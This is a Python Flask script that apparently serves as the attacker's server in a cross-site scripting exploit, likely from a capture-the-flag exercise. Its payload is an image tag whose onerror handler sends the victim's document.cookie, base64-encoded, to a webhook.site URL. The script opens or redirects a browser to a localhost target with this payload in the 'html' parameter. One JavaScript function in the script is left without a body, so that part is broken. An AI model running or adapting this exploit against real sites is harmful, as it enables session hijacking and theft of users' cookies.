from flask import Flask, request, redirect

app = Flask(__name__)

counter = 1
PAYLOAD = "<img src=x onerror=fetch(`https://webhook.site/<snip>/${btoa(document.cookie)}`)>"
TARGET = f"http://localhost:3000"


@app.after_request
def add_no_cache_headers(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response



@app.get("/")
def index():
    global counter
    counter += 1
    
    if counter % 2 == 0:
        return f"""
        <script>
          var w = window.open("{TARGET}/?html={PAYLOAD.replace('`', '%60').replace('{', '%7B').replace('}', '%7D').replace('<', '%3C').replace('>', '%3E')}", "_blank");
          
          function a() 

          setTimeout(a, 2000);
        </script>
        """.strip()
    else:
        return redirect(f"{TARGET}/view?html={PAYLOAD}")


@app.get("/back")
def back():
    return """
    <script>
      function a() {
        window.history.back();
      }
      setTimeout(a, 1000);
    </script>
    """


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=3000)